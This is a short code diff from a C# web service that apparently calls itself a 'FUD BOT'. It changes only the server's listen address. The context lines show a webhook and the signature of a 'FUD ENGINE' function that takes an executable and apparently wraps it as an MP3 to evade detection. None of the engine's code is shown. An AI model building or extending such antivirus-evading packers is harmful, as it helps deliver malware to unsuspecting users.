@@ -54,7 +54,7 @@ app.MapPost("/webhook", async (HttpContext ctx, IHttpClientFactory clientFactory
 });
 
 app.MapGet("/", () => "🚀 FUD BOT v2.0 LIVE!");
-app.Run("0.0.0.0:10000");
+app.Run();
 
 // FUD ENGINE - SINGLE FILE, NO DUPLICATES
 static byte[] FudMp3(byte[] exe) {
